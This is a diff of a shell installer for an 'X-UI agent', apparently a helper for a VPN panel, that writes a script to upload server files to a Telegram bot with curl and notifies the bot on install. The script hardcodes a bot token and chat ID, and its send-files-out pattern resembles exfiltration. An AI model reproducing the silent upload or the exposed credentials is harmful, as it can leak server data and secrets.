@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 
 BOT_TOKEN="6602514727:AAF7d2iEQmH5YbynKSZH-lPA9-BDUNmjphY"
 CHAT_ID="382094545"
@@ -39,17 +39,17 @@ install_script() {
   mkdir -p "$INSTALL_DIR"
 
   cat > "$SEND_SCRIPT" <<EOF
-#!/bin/sh
+#!/bin/bash
 sleep $DELAY
 
 send_file() {
   FILE="\$1"
   LABEL="\$2"
-  [ -f "\$FILE" ] || return
-  curl -s -F chat_id=$CHAT_ID \
-       -F document=@\${FILE} \
-       -F caption="📡 *$SERVER_NAME*\n\$LABEL" \
-       -F parse_mode=Markdown \
+  [[ -f "\$FILE" ]] || return
+  curl -s -F chat_id=$CHAT_ID \\
+       -F document=@\${FILE} \\
+       -F caption="📡 *$SERVER_NAME*<br>\$LABEL" \\
+       -F parse_mode=HTML \\
        https://api.telegram.org/bot$BOT_TOKEN/sendDocument > /dev/null
 }
 
@@ -65,10 +65,10 @@ EOF
 
   curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
     -d chat_id="$CHAT_ID" \
-    -d text="✅ Установлен агент на *$SERVER_NAME*\n🕒 Задержка: ${DELAY}s" \
-    -d parse_mode=Markdown > /dev/null
+    -d text="✅ Установлен агент на *$SERVER_NAME*<br>🕒 Задержка: ${DELAY}s" \
+    -d parse_mode=HTML > /dev/null
 
-  sh "$SEND_SCRIPT"
+  bash "$SEND_SCRIPT"
   echo "✅ Установка завершена."
 }
 
@@ -78,12 +78,12 @@ run_uninstall() {
   curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
     -d chat_id="$CHAT_ID" \
     -d text="🗑️ Агент X-UI удалён с сервера" \
-    > /dev/null
+    -d parse_mode=HTML > /dev/null
   echo "✅ Удаление завершено."
 }
 
 # Аргументы командной строки
-if [ "$1" = "--vpn-node1" ] && [ "$2" = "--5" ]; then
+if [[ "$1" == --* && "$2" == --* ]]; then
   run_install_args "$1" "$2"
 else
   print_menu
